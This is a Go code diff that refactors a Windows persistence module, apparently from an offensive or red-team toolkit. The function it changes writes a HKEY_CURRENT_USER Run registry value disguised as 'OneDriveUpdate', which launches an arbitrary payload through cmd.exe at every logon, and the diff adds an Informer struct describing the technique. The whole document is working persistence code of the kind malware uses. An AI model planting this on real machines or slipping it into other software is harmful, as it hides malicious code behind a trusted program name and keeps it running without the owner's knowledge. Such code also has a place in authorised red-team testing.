@@ -7,14 +7,14 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-func pHkcu(path string) error {
-	_ = Reporter{
+func w32_nt_persistence_hkcu(p string) (error, Informer) {
+	inf := Informer{
 		Name: "hkcuruner",
 		Desc: "Gain persistence using HKEY_CURRENT_USER Run registry key",
 		Id:   4,
 
 		Type:   "Persistence",
-		Module: "pHkcu",
+		Module: "w32_nt_persistence_hkcu",
 
 		Fixed:   false,
 		FixedIn: "",
@@ -23,11 +23,14 @@ func pHkcu(path string) error {
 		Payload: true,
 	}
 
-	fullPath, err := filepath.Abs(path)
+	// Get absolute path of payload file.
+	fPath, err := filepath.Abs(p)
 	if err != nil {
-		return err
+		return err, inf
 	}
-	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)
+
+	// C:\Windows\System32\cmd.exe /k start `path`
+	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)
 
 	// Open key in `Software\Microsoft\Windows\CurrentVersion\Run`
 	wk32, err := registry.OpenKey(
@@ -36,12 +39,13 @@ func pHkcu(path string) error {
 	)
 	defer wk32.Close()
 	if err != nil {
-		return err
+		return err, inf
 	}
-
-	// Set OneDriveUpdate to fullPath (absolute program path)
 	if err := wk32.SetStringValue("OneDriveUpdate", cmdN); err != nil {
-		return err
+		return err, inf
 	}
-	return nil
+	return nil, inf
 }
+
+// NewPersistenceHKCU return error if errors contains and Informer struct with data for informating about vulnerabilitie.
+func NewPersistenceHKCU(p string) (error, Informer) { return w32_nt_persistence_hkcu(p) }
